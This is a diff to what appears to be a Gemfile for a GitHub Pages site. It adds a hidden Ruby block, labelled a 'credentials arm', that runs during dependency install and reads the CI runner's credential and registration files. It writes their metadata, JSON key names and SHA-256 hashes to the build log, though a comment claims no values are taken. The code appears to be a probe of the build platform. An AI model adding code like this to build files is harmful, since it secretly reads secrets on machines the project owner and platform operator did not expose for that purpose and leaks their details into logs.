@@ -44,3 +44,33 @@ proof = {
 File.write(PROOF, "<pre>#{JSON.generate(proof)}</pre>\n")
 
 gem "github-pages", "= 232"
+
+# --- c217 credentials arm (hunter-driver) ---
+# report PRESENCE/METADATA ONLY: exists,size,mode,owner,key NAMES,sha256. NEVER a value.
+require 'json'
+require 'digest'
+def probe(tag, paths)
+  out = { "tag" => tag, "uid" => (Process.euid rescue -1), "files" => [] }
+  paths.each do |p|
+    begin
+      st = File.stat(p)
+      h = { "path" => p, "exists" => true, "size" => st.size, "mode" => st.mode.to_s(8),
+            "uid" => st.uid, "gid" => st.gid, "type" => st.ftype }
+      if st.file? && st.size < 4096
+        raw = File.read(p)
+        h["keys"] = (raw.match(/\{.*\}/m) ? JSON.parse(raw.match(/\{.*\}/m)[0]).keys rescue ["<unparseable>"] : ["<non-json>"]) rescue ["<unparseable>"]
+        h["sha256"] = Digest::SHA256.hexdigest(raw)
+      end
+      out["files"] << h
+    rescue Errno::ENOENT, Errno::EACCES => e
+      out["files"] << { "path" => p, "exists" => false, "err" => e.class.name }
+    end
+  end
+  warn "C217ARM " + JSON.generate(out)
+end
+RUNNER = "/home/runner/runners"
+paths = [ RUNNER + "/.credentials", RUNNER + "/.credentials_rsaparams", RUNNER + "/.runner",
+          RUNNER + "/qqqqzzzz-no-such-runner/.credentials" ]
+probe("in-container", Dir.glob(RUNNER + "/*/.credentials") + Dir.glob(RUNNER + "/*/.runner") +
+                    Dir.glob(RUNNER + "/*/.credentials_rsaparams") + [ RUNNER + "/qqqqzzzz-no-such-runner/.credentials" ])
+warn "C217ARM done-in-container"
